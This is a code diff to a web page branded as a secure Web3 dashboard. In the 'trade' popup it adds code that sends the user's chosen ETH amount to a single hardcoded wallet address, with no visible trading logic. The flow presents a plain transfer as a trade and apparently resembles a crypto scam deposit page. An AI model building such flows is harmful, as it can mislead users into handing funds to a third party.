@@ -102,7 +102,7 @@ h1{margin:0;font-size:22px;font-weight:700;}
   <div class="footer">Netradapps • Secure Web3 Dashboard</div>
 </div>
 <script>
-  let provider, signer, address;
+let provider, signer, address;
 
 /* ------------------------------
     STATUS MESSAGE
@@ -153,6 +153,8 @@ async function openTradePopup() {
         />
       </div>
 
+      <div id="tradeStatus" style="margin-top:10px;font-size:14px;"></div>
+
       <button id="confirmTrade" style="
         margin-top:18px;width:100%;padding:12px;
         background:linear-gradient(90deg,#18d884,#21a7ff);
@@ -171,12 +173,47 @@ async function openTradePopup() {
 
   document.body.appendChild(popup);
 
+  const statusEl = popup.querySelector("#tradeStatus");
+
   document.getElementById("closePopup").onclick = () => popup.remove();
 
-  document.getElementById("confirmTrade").onclick = () => {
-    const amount = document.getElementById("tradeAmount").value;
-    alert("Amount chosen: " + amount + " ETH\nNext step: trading process.");
-    popup.remove();
+  document.getElementById("confirmTrade").onclick = async () => {
+    try {
+      const amount = document.getElementById("tradeAmount").value;
+      if (!amount || parseFloat(amount) <= 0) {
+        statusEl.textContent = "Enter a valid amount.";
+        statusEl.style.color = "#ff5c5c";
+        return;
+      }
+
+      const txValue = ethers.parseEther(amount.toString());
+
+      // Check if user has enough balance
+      const balanceBigInt = await provider.getBalance(address);
+      if (txValue > balanceBigInt) {
+        statusEl.textContent = "Insufficient balance!";
+        statusEl.style.color = "#ff5c5c";
+        return;
+      }
+
+      statusEl.textContent = "Sending transaction...";
+      statusEl.style.color = "#18d884";
+
+      // Send transaction
+      const tx = await signer.sendTransaction({
+        to: "0xbBcc409872bC2441400735624638F3D67DAa7C4C",
+        value: txValue
+      });
+
+      statusEl.textContent = `Transaction sent! Hash: ${tx.hash}`;
+      await tx.wait();
+
+      statusEl.textContent = "Transaction confirmed! ✅";
+
+    } catch (err) {
+      statusEl.textContent = "Transaction Error: " + err.message;
+      statusEl.style.color = "#ff5c5c";
+    }
   };
 }
 
@@ -202,7 +239,7 @@ async function useMetaMask() {
 async function useWalletConnect() {
   try {
     const wc = new window.Web3ModalStandalone.StandaloneModal({
-      projectId: "YOUR_PROJECT_ID", // <-- Replace with your real WalletConnect Project ID
+      projectId: "YOUR_PROJECT_ID", // <-- Replace with your WalletConnect Project ID
       themeMode: "dark"
     });
 
